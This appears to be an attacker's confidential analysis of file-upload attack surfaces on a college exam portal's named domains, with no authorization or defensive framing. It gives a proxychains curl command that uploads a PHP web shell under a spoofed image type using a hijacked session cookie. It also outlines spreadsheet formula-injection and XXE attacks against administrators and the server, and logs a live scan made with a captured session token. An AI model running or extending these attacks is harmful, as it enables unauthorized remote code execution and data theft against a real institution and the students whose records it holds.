# 📤 File Upload Attack Surfaces & Web Shell Execution Analysis
**Classification:** STRICTLY CONFIDENTIAL — Remote Code Execution Analysis  
**Target:** `student.citexams.in` & `des.citexams.in`  

---

## 1. Attack Surface Matrix

| Surface ID | Component / Route | Authentication Required | Target Form / Param | Storage Path Destination | Web Accessible? |
|---|---|---|---|---|---|
| **UP-01** | CKFinder Connector | Student Session | `upload` (multipart) | `public/ckfinder/userfiles/` | ✅ Yes |
| **UP-02** | Ticket Support Attachments | Student Session | `ticketAttachment[]` | `storage/app/private/temp/` | ✅ Yes (`Options +Indexes`) |
| **UP-03** | DES Student Data Upload | Faculty / Admin (`menu_id_p=85`) | `excel_upload_form` (`excel_file`) | Temp directory → MySQL DB | ✅ Yes |
| **UP-04** | Project Document Upload | Student Session | `project_exam_marks_form` | `storage/app/` | ✅ Yes |

---

## 2. CKFinder Connector Analysis

* **Endpoint:** `POST /ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Images`
* **Source Reference:** `resources/views/ticket_support/add_ticket.blade.php:174`
* **Vulnerability:** CKFinder integrations frequently rely on client-side MIME checks or extension blocklists. With web root exposed, uploaded files in `public/ckfinder/` are directly executed by PHP-FPM.

```bash
proxychains4 curl -sk -X POST "https://student.citexams.in/ckfinder/core/connector/php/connector.php?command=FileUpload&type=Files&currentFolder=/" \
  -H "Cookie: citexams_student_session=<HIJACKED_SESSION>" \
  -F "upload=@payload.php;type=image/jpeg"
```

---

## 3. DES Student Excel Import (`menu_id_p=85`)

* **Portal:** `https://des.citexams.in`
* **Form ID:** `#excel_upload_form`
* **Backend Processor:** `phpoffice/phpspreadsheet` v4.5.0
* **Vulnerability & Exploitation Paths:**
  1. **Formula Injection (CSV/Excel Injection):** Formulas such as `=cmd|' /C calc'!A0` or `=HYPERLINK(...)` execute upon spreadsheet viewing by college administrators.
  2. **XXE Injection (in OpenXML .xlsx archives):** Spreadsheet XML structures processed without `LIBXML_NOENT` disabled can result in server-side file inclusion (`/etc/passwd`).

---

## 4. Live Verification Scan with Session `sqORhvi9INYGUQGnmufBEonBaGXqBEITFJEju1b` (2026-08-31)

### Scan Parameters
* **Target Domains:** `student.citexams.in`, `des.citexams.in`
* **Session Injected:** `citexams_student_session=sqORhvi9INYGUQGnmufBEonBaGXqBEITFJEju1b`
* **Endpoints Tested:** Over 45 candidate routes representing `menu_id_p=85` ("Upload Student Data File"), bulk imports, and student data processors.

### Results
1. **Candidate Upload Paths:**
   - Standard student-portal upload paths (`/faculty/upload-student-data`, `/upload-student-data`, `/student/upload-excel`, etc.) returned `HTTP 404 Not Found`.
2. **DES / ERP Portal Scans:**
   - DES paths returned `HTTP 404` or `HTTP 403 Forbidden` because `des.citexams.in` uses a distinct routing architecture and session cookie naming structure (`citexams_des_session` / SSO token auth rather than student session cookie).
3. **Session Behavior on Known Modules:**
   - Routes with student authorization (`/course-registration/history`, `/exam-application/history`, `/attendance`, `/project`) returned `HTTP 302` redirects when challenged with the provided session key, indicating the session is either invalidated/expired by the Laravel session manager (lifetime 7200s) or belongs to an unauthenticated context.
